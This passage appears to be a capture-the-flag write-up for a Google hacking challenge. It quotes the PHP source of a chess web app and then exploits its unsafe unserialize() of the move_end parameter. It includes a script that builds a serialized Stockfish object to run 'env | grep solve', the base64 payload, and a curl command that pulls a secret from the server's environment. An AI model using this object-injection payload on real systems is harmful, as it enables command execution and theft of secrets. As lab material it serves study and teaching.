                }
            } else {
                // restart move
                $url = $this->getCancelUrl($identifier);
                $class = 'current';
            }
            $links[$i] = new Link($class, $url);
        }
        return $links;
    }
    public function getStartUrl(string $from, $identifier = null): string
    {
        return '?move_start='.$from;
    }
    public function getEndUrl(string $from, string $to, $identifier = null): string
    {
        $data = base64_encode(serialize(array($from, $to)));
        return '?move_end='.$data;
    }
    public function getCancelUrl($identifier = null): string
    {
        return '?cancel';
    }
    public function getPromotionUrl(string $from, string $to, $identifier = null): string
    {
        return '?promotion='.$from.'/'.$to;
    }
}
function init_chess()
{
    $chess = new Chess();
    return $chess;
}
function list_moves_square(string $square, Chess $chess_state)
{
    $moves = $chess_state->moves();
    $valid_moves = array();
    foreach ($moves as $move) {
        #print ($move->from . " " . $square . "\n");
        if ($move->from == $square) {
            #print_r($move);
            array_push($valid_moves, $move);
        }
    }
    return $valid_moves;
}
if (isset($_SESSION['board']) && $_SESSION['board'] !== "") {
    //echo "Board already set?\n";
    //echo $_SESSION['board'];
    $chess = unserialize($_SESSION['board']);
} else {
    $chess = init_chess();
}
$output = new MyHtmlOutput();
if (isset($_GET['move_start'])) {
    echo $output->render($chess, $_GET['move_start']);
} elseif (isset($_GET['move_end'])) {
    $movei = unserialize(base64_decode($_GET['move_end']));
    if ($chess->turn == "b") {
      #XXX: this should never happen.
      $chess = init_chess();
      $_SESSION['board'] = serialize($chess);
      die('Invalid Board state. Refresh the page');
    }
    echo "";
    $valid_moves = list_moves_square($movei[0], $chess);
    $invalid_move = True;
    foreach ($valid_moves as $move) {
        if ($move->to == $movei[1]) {
          $chess->move($move->san);
          $invalid_move = False;
        }
    }
    if (!$invalid_move) {
      $stockf = new Stockfish();
      $stockf->passUci();
      $stockf->passPosition($chess->fen());
      $move_s = $stockf->readOutput();
      $move_s = explode(" ", $move_s);
      $move_best = $move_s[1];
      //echo $move_best;;
      $bm_from = substr($move_best, 0, 2);
      $bm_to = substr($move_best, 2, 2);
      $chess->move(['from' => $bm_from, "to" => $bm_to]);
    }
    echo $output->render($chess);
    if ($chess->inCheckmate()) {
        if ($chess->turn != "b") {
            echo 'You lost! Game Over!';
        } else {
            echo "Winning against me won't help anymore. You need to get the flag from my envs." . "";
        }
    }
} else {
    echo $output->render($chess);
}
$_SESSION["board"] = serialize($chess);
//echo $_SESSION['board'];
?>
getHistory()->getEntries();
?>
MOVES
';
    if ($entry->moveNumber == 7 && $_SESSION['cheats_enabled'] !== "0") {
        applyCheatsAI($chess);
        $_SESSION["board"] = serialize($chess);
    }
    echo  ''.$entry->moveNumber;
    echo ''. ' _ ' . $entry->move->from.'';
    echo ''. ' _ ' .$entry->move->to.'';
    //var_dump( $entry);
    echo "";
}
?>
PRIVACY & TERMS
  ```
  ### load_board.php
  ```php
  ```
Reading through the code, it seems that this logic contains an *object deserialization* vulnerability. 
Let's take a look at how a single move is executed during the game.
A board is represented by the following HTML:
```html
8
7
6
5
4
3
2
1
abcdefgh
```
Notice how some of the pieces contain a link with `move_start=x`. For every turn, the user starts by clicking the piece which they want to move. 
For example, if we click the pawn at `d2`, we get transferred to `/?move_start=d2` and the board HTML now contains:
```html
8
7
6
5
4
3
2
1
abcdefgh
```
What we see here is two squares marked as `target`s - representing the two legal locations which our pawn can move to. Each of these legal squares has a `move_end=x` link, which is used to conclude the move. The value of `move_end` is a base64 string, let's take a look at one of the strings for example:
```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP001/Challenge_02]
└─$ echo YToyOntpOjA7czoyOiJkMiI7aToxO3M6MjoiZDQiO30= | base64 -d
a:2:{i:0;s:2:"d2";i:1;s:2:"d4";}
```
This is how a PHP serialized object looks like. We can see here an **a**rray of 2 items, the first **i**ndex is a **s**tring with the value "`d2`" and the second is a **s**tring with the value of "`d4`". 
The array gets deserialized by the PHP script and used to determine the move here:
```php
$movei = unserialize(base64_decode($_GET['move_end']));
```
However, at that point in the code, the server has no real control on what gets deserialized. If we provide a different object in serialized format, it will get deserialized and assigned to `$movei` (what happens later really depends on the logic of the script and on how `$movei` is used).
What object should we try to instantiate? Well, `Stockfish` is a perfect choice since it has a `__wakeup` function that gets called automatically when an object gets deserialized, and allows us to trigger an external process of our choice:
```php
class Stockfish
{
    public $binary = "/usr/games/stockfish";
    // ...
    public function __wakeup()
    {
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
        echo 'pipes[1], 4096).'-->';
    }
}
```
We even get the output of the external process as an HTML comment!
So, which command should we run? Based on the source code, we should inspect the environment variables:
```php
    if ($chess->inCheckmate()) {
        if ($chess->turn != "b") {
            echo 'You lost! Game Over!';
        } else {
            echo "Winning against me won't help anymore. You need to get the flag from my envs." . "";
        }
    }
```
Let's create a mini-script to serialize `StockFish` with our malicious command:
```php
 'true');
    public $descriptorspec = array(
        0 => array("pipe","r"),
        1 => array("pipe","w"),
    );
}
$stockf = new Stockfish();
$x = serialize($stockf);
echo base64_encode($x);
?>
```
Its output:
```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP001/Challenge_03]
└─$ php -e ./serialize.php
Tzo5OiJTdG9ja2Zpc2giOjQ6e3M6MzoiY3dkIjtzOjI6Ii4vIjtzOjY6ImJpbmFyeSI7czozOToiZW52IHwgZ3JlcCBzb2x2ZSB8IC91c3IvZ2FtZXMvc3RvY2tmaXNoIjtzOjEzOiJvdGhlcl9vcHRpb25zIjthOjE6e3M6MTI6ImJ5cGFzc19zaGVsbCI7czo0OiJ0cnVlIjt9czoxNDoiZGVzY3JpcHRvcnNwZWMiO2E6Mjp7aTowO2E6Mjp7aTowO3M6NDoicGlwZSI7aToxO3M6MToiciI7fWk6MTthOjI6e2k6MDtzOjQ6InBpcGUiO2k6MTtzOjE6InciO319fQ==
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP001/Challenge_03]
└─$ php -e ./serialize.php | base64 -d
O:9:"Stockfish":4:{s:3:"cwd";s:2:"./";s:6:"binary";s:39:"env | grep solve | /usr/games/stockfish";s:13:"other_options";a:1:{s:12:"bypass_shell";s:4:"true";}s:14:"descriptorspec";a:2:{i:0;a:2:{i:0;s:4:"pipe";i:1;s:1:"r";}i:1;a:2:{i:0;s:4:"pipe";i:1;s:1:"w";}}}
```
Finally, let's provide it as the `move_end`:
```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP001/Challenge_03]
└─$ curl "https://hackerchess2-web.h4ck.ctfcompetition.com/?move_end=$(php -e ./serialize.php)" -s | grep solve
--><!-- XXX : Debug remove this Unknown command: REDIRECT_FLAG2=https://h4ck1ng.google/solve/rc3_l1k3_4_tru3_ch355_m45t3r
```